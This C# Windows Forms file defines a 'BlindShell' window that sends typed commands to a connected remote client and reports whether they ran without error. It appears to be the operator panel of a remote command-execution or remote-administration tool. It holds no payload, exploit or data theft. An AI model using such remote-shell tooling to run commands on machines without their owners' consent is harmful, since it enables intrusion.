using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace WindowsFormsApp8
{
    public partial class BlindShell : Form
    {
        private Client client;
        public BlindShell(Client client)
        {
            InitializeComponent();
            this.client = client;
            client.errorShellReceived += OnErrorReceived;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            status.Text = "...";
            error.Text = "...";
            client.Send(Encoding.ASCII.GetBytes(text.Text), 13);
        }

        private void OnErrorReceived(byte[] buffer)
        {
            this.Invoke((MethodInvoker)delegate
            {
                if (Encoding.ASCII.GetString(buffer) == "")
                {
                    status.ForeColor = Color.Green;
                    status.Text = "No errors - Executed.";
                    error.Text = "No error.";
                }
                else
                {
                    status.ForeColor = Color.Black;
                    status.Text = "error while trying to execute.";
                    error.Text = Encoding.ASCII.GetString(buffer);
                }
            });
        
        }

        private void button2_Click(object sender, EventArgs e)
        {
            status.Text = "...";
            error.Text = "...";
            client.Send(Encoding.ASCII.GetBytes("\0"), 15);
        }

        private void BlindShell_Load(object sender, EventArgs e)
        {
            this.TopMost = true;
        }
    }
}
